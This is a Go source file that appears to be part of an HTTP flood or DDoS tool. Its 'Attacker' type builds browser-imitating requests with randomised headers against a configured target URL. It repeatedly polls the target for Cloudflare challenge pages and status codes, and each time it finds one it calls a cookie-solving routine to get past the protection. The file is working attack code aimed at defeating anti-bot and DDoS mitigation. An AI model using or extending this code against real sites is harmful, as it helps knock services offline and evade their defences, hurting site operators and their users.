package main

import (
	"crypto/tls"
	"golang.org/x/net/html"
	"io"
	"math/rand"
	"net/http"
	"time"
)

func (a *Attacker) BuildCheckerRequest() (*http.Request, error) {
	var request *http.Request
	var err error
	request, err = http.NewRequest("GET", a.attack.TargetURL, nil)
	if err != nil {
		return nil, err
	}
	request.Header.Add("Connection", "keep-alive")
	request.Header.Add("DNT", "1")
	request.Header.Add("Upgrade-Insecure-Requests", "1")
	request.Header.Add("User-Agent", a.userAgent)
	request.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	request.Header.Add("Sec-Fetch-Site", "none")
	request.Header.Add("Sec-Fetch-Mode", "navigate")
	request.Header.Add("Sec-Fetch-User", "?1")
	request.Header.Add("Sec-Fetch-Dest", "document")
	if a.attack.AcceptEncoding == "" {
		request.Header.Add("Accept-Encoding", acceptEncodings[rand.Intn(len(acceptEncodings))])
	} else {
		request.Header.Add("Accept-Encoding", a.attack.AcceptEncoding)
	}
	if a.attack.AcceptLanguage == "" {
		request.Header.Add("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
	} else {
		request.Header.Add("Accept-Language", a.attack.AcceptLanguage)
	}
	if len(a.cookies) > 0 {
		for _, cookie := range a.cookies {
			request.AddCookie(&http.Cookie{Name: cookie.Name, Value: cookie.Value})
		}
	}
	return request, nil
}

func (a *Attacker) CheckResponse(expired chan bool) {
	exit := false
	go func() {
		exit = <-expired
	}()
	client := &http.Client{
		Transport: &http.Transport{
			Proxy:        nil,
			TLSNextProto: make(map[string]func(authority string, c *tls.Conn) http.RoundTripper),
		},
	}
	for {
		if exit {
			break
		}
		request, err := a.BuildCheckerRequest()
		if err != nil {
			time.Sleep(time.Second)
			continue
		}
		r, err := client.Do(request)
		if err != nil {
			time.Sleep(time.Second)
			continue
		}
		if r.StatusCode == 403 {
			a.SolveCookie()
		} else if r.StatusCode == 503 {
			title, err := GetHtmlTitle(r.Body)
			if err != nil {
				time.Sleep(time.Second)
				continue
			}
			if title == "Just a moment..." {
				a.SolveCookie()
			}
		} else if r.StatusCode == 200 {
			title, err := GetHtmlTitle(r.Body)
			if err != nil {
				time.Sleep(time.Second)
				continue
			}
			if title == "Attention Required! | Cloudflare" {
				a.SolveCookie()
			}
		}
		r.Body.Close()
		time.Sleep(time.Second)
	}
}

func IsTitleElement(n *html.Node) bool {
	return n.Type == html.ElementNode && n.Data == "title"
}

func Traverse(n *html.Node) (string, bool) {
	if IsTitleElement(n) {
		return n.FirstChild.Data, true
	}

	for c := n.FirstChild; c != nil; c = c.NextSibling {
		result, ok := Traverse(c)
		if ok {
			return result, ok
		}
	}

	return "", false
}

func GetHtmlTitle(r io.Reader) (string, error) {
	doc, err := html.Parse(r)
	if err != nil {
		return "", err
	}
	title, _ := Traverse(doc)
	return title, nil
}
